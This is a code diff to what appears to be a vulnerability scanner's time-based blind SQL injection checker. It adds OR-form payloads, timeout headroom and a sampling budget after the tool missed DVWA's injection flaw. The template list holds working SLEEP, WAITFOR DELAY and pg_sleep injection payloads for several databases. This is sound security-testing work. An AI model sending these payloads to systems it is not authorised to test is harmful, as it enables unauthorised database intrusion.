@@ -42,15 +42,46 @@ SAMPLES = 10
 # request that got cut short is not proof of anything.
 MIN_SHARE = 0.8
 
-# one payload per database. {cond} gets filled with a condition that is always
-# true and then one that is always false, which is what guarantees the pair can
-# only ever differ there.
+# A sleep in a where clause can be evaluated once per row, so asking for 2
+# seconds against a table with five rows in it buys ten. The ordinary timeout is
+# 10 seconds and DVWA's blind sql injection landed exactly on it: the payload
+# worked, the server was busy sleeping, and the client hung up before the answer
+# came back. So the timing test asks for a good deal longer than it thinks it
+# needs.
+TIMEOUT_HEADROOM = 8
+
+# and because those requests can be slow, cap how long one point may take rather
+# than multiplying a ten second request by twenty and walking away for an hour
+SAMPLING_BUDGET_MS = 120_000
+
+
+def _timeout_for(delay_seconds):
+    return delay_seconds * TIMEOUT_HEADROOM + 5
+
+# Payloads to try, one per database, in both AND and OR form. {cond} gets filled
+# with a condition that is always true and then one that is always false, which
+# is what guarantees the pair can only ever differ there.
+#
+# Both forms are needed because databases stop evaluating a condition as soon as
+# the answer is settled. With AND, if the part before it is false the sleep is
+# never reached. With OR, if the part before it is true the sleep is never
+# reached. Which one works depends entirely on whether the value we started from
+# matches a row, and we have no way of knowing that in advance.
+#
+# DVWA's blind sql injection is exactly this. The form field is empty so the
+# crawler starts from "test", no user is called test, user_id = 'test' is false
+# for every row, and every AND payload got short circuited away. The bug was
+# real, the sleep worked when asked directly, and the scanner still called it
+# clean. The OR form finds it.
 TEMPLATES = [
-    " AND IF({cond},SLEEP({d}),0)",                                 # mysql, number
     "' AND IF({cond},SLEEP({d}),0) -- ",                            # mysql, text
+    "' OR IF({cond},SLEEP({d}),0) -- ",                             # mysql, text
+    " AND IF({cond},SLEEP({d}),0)",                                 # mysql, number
+    " OR IF({cond},SLEEP({d}),0)",                                  # mysql, number
     "'; IF ({cond}) WAITFOR DELAY '0:0:{d}' -- ",                   # sql server
     " AND (CASE WHEN {cond} THEN (SELECT 1 FROM pg_sleep({d})) ELSE 1 END)=1",  # postgres
     " AND (CASE WHEN {cond} THEN sleep({d}) ELSE 0 END)",           # sqlite
+    " OR (CASE WHEN {cond} THEN sleep({d}) ELSE 0 END)",            # sqlite
 ]
 
 # same length, so the two payloads built from a template come out identical
@@ -88,12 +119,12 @@ def looks_delayed(true_ms, false_ms, delay_seconds=DELAY_SECONDS):
     return bool(gap >= wanted_ms and separated), stats
 
 
-def _collect(client, point, true_payload, false_payload, count):
+def _collect(client, point, true_payload, false_payload, count, timeout):
     """Take the samples, alternating, so anything that drifts hits both sets."""
     true_ms, false_ms = [], []
     for _ in range(count):
-        true_ms.append(send(client, point, true_payload).elapsed_ms)
-        false_ms.append(send(client, point, false_payload).elapsed_ms)
+        true_ms.append(send(client, point, true_payload, timeout=timeout).elapsed_ms)
+        false_ms.append(send(client, point, false_payload, timeout=timeout).elapsed_ms)
     return true_ms, false_ms
 
 
@@ -106,11 +137,13 @@ def validate(client, point, reason=None, delay_seconds=DELAY_SECONDS, samples=SA
         true_payload = base + template.format(cond=TRUE_COND, d=delay_seconds)
         false_payload = base + template.format(cond=FALSE_COND, d=delay_seconds)
 
+        timeout = _timeout_for(delay_seconds)
+
         try:
             # one cheap look before committing to twenty slow requests. a
             # payload the database never ran comes back at normal speed the
             # first time, and most of them never run, wrong dialect or no bug.
-            first = send(client, point, true_payload)
+            first = send(client, point, true_payload, timeout=timeout)
             if first.elapsed_ms < screen_ms:
                 tried.append({
                     "true_payload": true_payload,
@@ -119,8 +152,12 @@ def validate(client, point, reason=None, delay_seconds=DELAY_SECONDS, samples=SA
                 })
                 continue
 
+            # now we know what one costs, work out how many we can afford
+            affordable = int(SAMPLING_BUDGET_MS / max(first.elapsed_ms, 1.0))
+            take = max(5, min(samples, affordable))
+
             true_ms, false_ms = _collect(client, point, true_payload,
-                                         false_payload, samples)
+                                         false_payload, take, timeout)
         except Exception as e:
             return Finding("sqli", point, Verdict.UNCONFIRMED,
                            f"could not finish the timing test: {e}",
@@ -140,7 +177,7 @@ def validate(client, point, reason=None, delay_seconds=DELAY_SECONDS, samples=SA
             return Finding(
                 "sqli", point, Verdict.CONFIRMED,
                 f"true condition took {stats['median_gap_ms']:.0f} ms longer than "
-                f"false, every time, over {samples} samples each",
+                f"false, every time, over {take} samples each",
                 {"detector_reason": reason, "technique": "timing", "proof": proof},
             )
 
